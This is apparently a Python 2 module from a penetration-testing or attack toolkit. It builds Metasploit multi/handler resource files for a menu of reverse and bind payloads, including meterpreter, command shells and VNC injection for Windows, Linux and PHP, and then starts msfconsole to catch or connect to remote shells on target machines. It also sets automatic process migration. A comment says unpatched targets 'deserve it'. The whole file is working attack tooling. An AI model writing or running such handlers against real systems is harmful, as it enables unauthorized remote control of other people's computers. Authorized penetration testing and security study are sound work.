#!/usr/bin/python
#
# start metasploit listener
#
# this will grow, currently only covers the
# payload generated by paygen

import os
import subprocess
from src import menus
from src.main import *
from time import sleep

def reverse_listener():
	selection = 0
	while selection != range(1,8):
		clear()
		menus.listener_menu()
		selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
		if selection == '1':
			payload = "windows/x64/meterpreter/reverse_tcp"
			break
		if selection == '2':
			payload = "windows/meterpreter/reverse_tcp"
			break	
		if selection == '3':
			payload = "windows/x64/shell/reverse_tcp"
			break
		if selection == '4':
			payload = "windows/shell/reverse_tcp"
			break
		if selection == '5':
			payload = "php/meterpreter/reverse_tcp"
			break
		if selection == '6':
			payload = "linux/x64/meterpreter/reverse_tcp"
			break
		if selection == '7':
			payload = "linux/x86/shell/reverse_tcp"
			break
		if selection == '8':
			payload = "windows/vncinject/reverse_tcp"
			break

	port = raw_input("\nEnter listener port: ")

	PrintInfo("Starting multi handler")

	# create rc file
	rcfile = "/tmp/generic_listener.rc"
	fw = open(rcfile, "w")
	fw.write("use exploit/multi/handler\n")
	fw.write("set PAYLOAD %s\n" % payload)
	fw.write("set LHOST 0.0.0.0\n")
	fw.write("set LPORT %s\n" % port)
	fw.write("set ExitOnSession false\n")

	# set auto migrate for windows meterpreter sessions
	if not selection or selection in ('1','2'):
		fw.write("set AutoRunScript migrate -f\n")
	if not selection or selection in '8':
		fw.write("set DisableCourtesyShell true\n")
	fw.write("exploit -j -z")
	fw.close()

	# start listener
	PrintInfo("Setting up MSF reverse multi handler, please wait...")
	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()

	PrintInfo("Cleaning up...")
	os.remove(rcfile)
	sleep(1)
	
def bind_listener():
	selection = 0
	while selection != range(1,7):
		clear()
		menus.bind_title()
		menus.bind_menu()
		selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
		if selection == '1':
			payload = "windows/meterpreter/bind_tcp"
			break
		if selection == '2':
			payload = "windows/shell/bind_tcp"
			break
		if selection == '3':
			payload = "linux/x86/meterpreter/bind_tcp"
			break
		if selection == '4':
			payload = "linux/x86/shell/bind_tcp"
			break
		if selection == '5':
			payload = "php/meterpreter/bind_tcp"
			break
		if selection == '6':
			payload = "windows/x64/shell/bind_tcp"
			break
		if selection == '7':
			payload = "windows/x64/meterpreter/bind_tcp"
			break

	# get some info
	target = raw_input("\nEnter target IP: ")
	port = raw_input("Enter port for reverse connection: ")
	sleep(1)

	# create rc file
	rcfile = "/tmp/bind_tcp.rc"
	fw = open(rcfile, "w")
	fw.write("use exploit/multi/handler\n")
	fw.write("set RHOST %s\n" % target)
	fw.write("set PAYLOAD %s\n" % payload)
	fw.write("set LHOST 0.0.0.0\n")
	fw.write("set LPORT %s\n" % port)
	fw.write("set ExitOnSession false\n") 
	fw.write("exploit -j")
	fw.close()

	# exploit the target
	# they deserve it for not patching this!!!
	PrintInfo("Setting up MSF reverse multi handler, please wait...")
	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()

	# clean up
	print "\nCleaning up..."
	os.remove(rcfile)
	sleep(1)

while 1:
	try:
		selection = 0
		while selection != range(1,2):
			clear()
			print "%s%sStart MSF listerner%s\n\nSelect listener type:\n\n[1] reverse\n[2] bind\n\n[*] Hit ^c to go back\n" % (colours.bold, colours.green, colours.reset)
			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				reverse_listener()
			elif selection == '2':
				bind_listener()
				
			# return to main
			break
	except KeyboardInterrupt:
		break
